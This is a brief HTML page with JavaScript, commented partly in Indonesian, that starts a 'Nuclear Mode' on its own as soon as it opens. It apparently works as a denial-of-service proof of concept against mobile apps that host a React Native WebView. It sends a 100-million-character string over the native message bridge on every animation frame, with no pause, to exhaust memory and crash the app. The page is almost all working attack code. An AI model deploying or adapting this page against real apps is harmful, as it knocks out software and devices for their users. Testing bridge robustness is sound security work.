<body>
<h2>ðŸš¨ Auto Nuclear Mode Activated</h2>
<pre id="log"></pre>

<script>
const log = msg => document.getElementById("log").textContent += "\n" + msg;

function post(msg) {
    try {
        if (window.ReactNativeWebView) {
            window.ReactNativeWebView.postMessage(msg);
        } else {
            log("ReactNativeWebView not detected.");
        }
    } catch (e) {
        log("Error: " + e.message);
    }
}

function sendLongString() {
    const payload = "A".repeat(100_000_000);
    post(payload);
}

let nuclearActive = true;

function startNuclear() {
    log("ðŸš¨ Nuclear Mode started automatically!");
    (function loop() {
        if (!nuclearActive) return;
        sendLongString();
        requestAnimationFrame(loop); // tanpa jeda
    })();
}

// Langsung mulai saat halaman dibuka
startNuclear();
</script>

</body>
